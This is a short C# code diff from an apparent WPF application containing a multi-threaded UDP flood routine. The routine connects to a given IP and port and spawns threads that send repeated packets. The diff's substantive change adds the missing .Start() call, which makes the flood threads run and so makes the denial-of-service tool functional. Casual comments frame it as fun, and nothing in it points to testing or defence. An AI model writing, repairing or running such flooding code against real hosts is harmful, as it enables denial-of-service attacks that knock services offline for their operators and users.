@@ -46,7 +46,7 @@ namespace wpfVer2
             {
                 try
                 {
-                    client.Connect(ip, port); // this is where the fun starts 
+                    client.Connect(ip, port); // this is where the fun starts
                     byte[] sendBytes = Encoding.ASCII.GetBytes(message); // i don't actually know what to put here so i just put a simple http get request
                     client.AllowNatTraversal(true);
                     client.DontFragment = true;
@@ -72,7 +72,7 @@ namespace wpfVer2
             UdpClient client2 = new UdpClient(ipaddr, por); // this is just the udp client, nothing interesting
             for (int i = 1; i < threads; i++) // this opens all the threads
             {
-                new Thread(() => flood(ipaddr, por, client2, message));
+                new Thread(() => flood(ipaddr, por, client2, message)).Start();
             }
         }
 
